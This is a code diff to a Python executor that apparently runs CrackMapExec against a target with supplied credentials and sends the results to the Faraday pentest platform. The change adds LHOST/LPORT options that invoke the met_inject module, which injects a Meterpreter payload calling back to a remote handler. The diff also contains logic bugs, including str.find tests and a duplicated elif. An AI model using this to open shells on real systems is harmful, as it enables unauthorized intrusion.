@@ -14,20 +14,21 @@ def report(output):
         operating_system = []
         credential_passw = ''
 
-        if line.find('Unix'):
-            operating_system.append('Unix')
-        elif line.find('Windows'):
-            operating_system.append('Windows')
-
-        if ip_port:
-            sep = ip_port[0].index(':')
-            port = ip_port[0][sep+1:]
-
-        if line.find('(Pwn3d!)'):
-            info_domain = line.find("[+]")
-            credential_passw = f'{line[info_domain:]}'
-
         if ip:
+
+            if line.find('Unix'):
+                operating_system.append('Unix')
+            elif line.find('Windows'):
+                operating_system.append('Windows')
+
+            if ip_port:
+                sep = ip_port[0].index(':')
+                port = ip_port[0][sep + 1:]
+
+            if line.find('(Pwn3d!)'):
+                info_domain = line.find("[+]")
+                credential_passw = f'{line[info_domain:]}'
+
             faraday_host_info = {
                 "hosts": [{
                     "ip": ip[0],
@@ -61,9 +62,13 @@ def main():
     # ['EXECUTOR_CONFIG_CRACKMAPEXEC_IP',
     # 'EXECUTOR_CONFIG_CRACKMAPEXEC_USER',
     # 'EXECUTOR_CONFIG_CRACKMAPEXEC_PASS']
+    # 'EXECUTOR_CONFIG_CRACKMAPEXEC_LHOST']
+    # 'EXECUTOR_CONFIG_CRACKMAPEXEC_LPORT']
     ip = os.environ.get('EXECUTOR_CONFIG_CRACKMAPEXEC_IP')
     user = os.environ.get('EXECUTOR_CONFIG_CRACKMAPEXEC_USER', None)
     passw = os.environ.get('EXECUTOR_CONFIG_CRACKMAPEXEC_PASS', None)
+    lport = os.environ.get('EXECUTOR_CONFIG_CRACKMAPEXEC_LPORT', None)
+    lhost = os.environ.get('EXECUTOR_CONFIG_CRACKMAPEXEC_LHOST', None)
 
     if not ip:
         print("IP not provided", file=sys.stderr)
@@ -86,6 +91,18 @@ def main():
             '-u', user,
             '-p', passw,
         ]
+
+        if lport and lhost:
+
+            command += [
+                '--local-auth -M met_inject -o',
+                'LHOST=', lhost,
+                'LPORT=', lport
+            ]
+        elif lport and lhost:
+            print("IP hosting the handler (LHOST) or"
+                  "Handler port (LPORT) not provided",
+                  file=sys.stderr)
 
     else:
         print("Username or Password not provided."
